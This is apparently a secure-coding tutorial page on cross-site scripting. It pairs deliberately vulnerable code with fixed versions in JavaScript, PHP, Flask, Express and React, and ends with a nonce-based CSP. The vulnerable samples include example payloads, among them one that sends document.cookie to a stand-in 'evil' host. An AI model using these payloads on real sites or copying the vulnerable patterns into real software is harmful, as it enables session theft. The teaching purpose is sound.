# XSS Code Examples

## Table of Contents

- [How to Read These Examples](#how-to-read-these-examples)
- [1. Front-End DOM Sinks (Vanilla JS)](#1-front-end-dom-sinks-vanilla-js)
- [2. Reflected & Stored XSS (PHP)](#2-reflected--stored-xss-php)
- [3. Templates & Sanitization (Python/Flask)](#3-templates--sanitization-pythonflask)
- [4. Server-Rendered HTML (Node/Express)](#4-server-rendered-html-nodeexpress)
- [5. Framework Escape Hatches (React)](#5-framework-escape-hatches-react)
- [6. Wiring a Nonce-Based CSP](#6-wiring-a-nonce-based-csp)
- [Summary of Fixes](#summary-of-fixes)

## How to Read These Examples

Each pair shows the same feature implemented insecurely and then securely. The pattern is always the same: the vulnerable version writes untrusted data into a page (or a code sink) verbatim; the secure version *encodes for the output context*, *sanitizes* when rich HTML is genuinely needed, or *uses a safe API* that treats data as text.

## 1. Front-End DOM Sinks (Vanilla JS)

### Vulnerable: `innerHTML` fed from the URL

```javascript
// Renders a "greeting" from the URL fragment
const name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').innerHTML = 'Hello, ' + name;

// Attack:  https://app.example/#<img src=x onerror=alert(document.cookie)>
// innerHTML parses the payload as HTML -> onerror fires -> DOM XSS.
```

### Secure: treat data as text with `textContent`

```javascript
const name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').textContent = 'Hello, ' + name;
// textContent never parses HTML; the payload shows as literal text.

// If you MUST render user HTML, sanitize it first:
import DOMPurify from 'dompurify';
box.innerHTML = DOMPurify.sanitize(userSuppliedHtml);
```

### Vulnerable vs. secure sink table

| Vulnerable | Secure |
|---|---|
| `el.innerHTML = data` | `el.textContent = data` |
| `document.write(data)` | `el.append(document.createTextNode(data))` |
| `eval(data)` | `JSON.parse(data)` |
| `setTimeout('f('+data+')')` | `setTimeout(() => f(data), 0)` |
| `a.href = data` | `a.href = /^https?:/.test(data) ? data : '#'` |

## 2. Reflected & Stored XSS (PHP)

### Vulnerable: reflected search + stored comment

```php
<?php
// Reflected: query echoed straight into HTML
echo "<h1>Results for: " . $_GET['q'] . "</h1>";

// Stored: comment saved and later printed raw
$pdo->prepare("INSERT INTO comments (body) VALUES (?)")
    ->execute([$_POST['body']]);
// ...later...
foreach ($rows as $r) { echo "<li>" . $r['body'] . "</li>"; }
?>
// Attack q or body: <script>new Image().src='//evil/c?'+document.cookie</script>
```

### Secure: encode on output with `htmlspecialchars`

```php
<?php
// A single helper used at every output point
function h($s) {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// Reflected
echo "<h1>Results for: " . h($_GET['q']) . "</h1>";

// Stored: store raw, ENCODE when rendering
foreach ($rows as $r) { echo "<li>" . h($r['body']) . "</li>"; }

// Attribute context also needs ENT_QUOTES:
echo '<input value="' . h($_GET['q']) . '">';
?>
// The payload now renders as inert text: &lt;script&gt;...
```

## 3. Templates & Sanitization (Python/Flask)

### Vulnerable: manual string building + `| safe`

```python
@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form['comment']
    db.insert({'comment': comment})            # stored raw
    return f"<div>{comment}</div>"             # echoed raw -> XSS

# And in a template, the escape hatch reintroduces the bug:
#   <div>{{ comment | safe }}</div>   <!-- disables autoescaping -->
```

### Secure: rely on Jinja2 autoescaping; sanitize only rich HTML

```python
from flask import render_template, request
import nh3   # allow-list HTML sanitizer (ammonia bindings)

@app.route('/comment', methods=['POST'])
def post_comment():
    raw = request.form['comment']
    # Store canonical data. If this field is PLAIN text, store as-is
    # and let the template escape it. If it is RICH text, sanitize:
    clean = nh3.clean(raw, tags={'b','i','em','strong','a','p'},
                           attributes={'a': {'href','title'}})
    db.insert({'comment': clean})
    return render_template('comment.html', comment=clean)

# comment.html (autoescape is ON by default in Flask/Jinja2):
#   <div>{{ comment }}</div>        <!-- plain text: escaped, safe -->
#   <div>{{ comment | safe }}</div> <!-- ONLY because nh3 already cleaned it -->
```

> Note the discipline: for plain-text fields, do nothing special — let autoescaping work. Reach for `| safe` *only* in combination with a real sanitizer, never on raw user input.

## 4. Server-Rendered HTML (Node/Express)

### Vulnerable: template literal with raw input

```javascript
app.get('/hello', (req, res) => {
  // req.query.name flows straight into HTML
  res.send(`<h1>Hello ${req.query.name}</h1>`);
});
// Attack: /hello?name=<script>steal()</script>
```

### Secure: auto-escaping template engine + encoding helper

```javascript
// Option A: an auto-escaping view engine (e.g. Nunjucks, EJS with <%= %>)
//   Nunjucks escapes {{ name }} by default:
//     <h1>Hello {{ name }}</h1>
app.get('/hello', (req, res) => {
  res.render('hello', { name: req.query.name });  // escaped by the engine
});

// Option B: explicit context-aware encoding when concatenating
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
  .replace(/"/g,'&quot;').replace(/'/g,'&#39;');

app.get('/hello', (req, res) => {
  res.type('html').send(`<h1>Hello ${esc(req.query.name)}</h1>`);
});
```

## 5. Framework Escape Hatches (React)

### Vulnerable: `dangerouslySetInnerHTML` with user input

```jsx
function Bio({ bio }) {
  // Bypasses React's automatic escaping entirely
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}
// If `bio` is user-controlled, any markup executes.
```

### Secure: default escaping, or sanitize when HTML is required

```jsx
// Plain text: just interpolate — React escapes it.
function Bio({ bio }) {
  return <div>{bio}</div>;              // safe, escaped
}

// Genuinely rich HTML: sanitize before injecting.
import DOMPurify from 'dompurify';
function RichBio({ bioHtml }) {
  const clean = DOMPurify.sanitize(bioHtml);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// URL props need scheme validation too:
const href = /^https?:/i.test(user.url) ? user.url : '#';
return <a href={href}>site</a>;         // blocks javascript: URLs
```

## 6. Wiring a Nonce-Based CSP

Even with correct encoding, a strict CSP is the safety net that neutralizes any injection that slips through. Below, a per-request nonce is generated and every legitimate inline script is tagged with it; anything the attacker injects lacks the nonce and is blocked.

```javascript
// Express + a fresh nonce per response
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; ` +
    "object-src 'none'; base-uri 'none'");
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

// In the template, legitimate scripts carry the nonce:
//   <script nonce="{{ nonce }}"> ... </script>
// An injected <script> (no nonce) is refused by the browser.
```

## Summary of Fixes

| Symptom | Root cause | Fix |
|---|---|---|
| Payload runs from URL/DOM | `innerHTML`/`eval` sink | `textContent`; sanitize with DOMPurify |
| Reflected/stored HTML runs | Unescaped server output | Context-aware encoding (`htmlspecialchars`, autoescape) |
| Rich-text field runs script | Raw HTML trusted | Allow-list sanitizer (DOMPurify/nh3) |
| Framework hole | `dangerouslySetInnerHTML`/`| safe`/`v-html` | Remove hatch, or sanitize first |
| `javascript:` link fires | Unvalidated URL | Allow-list `http/https/mailto` schemes |
| Any injection executes | No runtime backstop | Nonce-based CSP + Trusted Types; `HttpOnly` cookies |

## Next Steps

- **[Overview](overview.html)**: Types, impact, and misconceptions
- **[Attack Vectors](attack-vectors.html)**: The contexts and sinks these fixes address
- **[Prevention](prevention.html)**: The full layered defense strategy
- **[Hands-On Lab](./lab/cross-site-scripting/)**: Practice turning vulnerable code into secure code
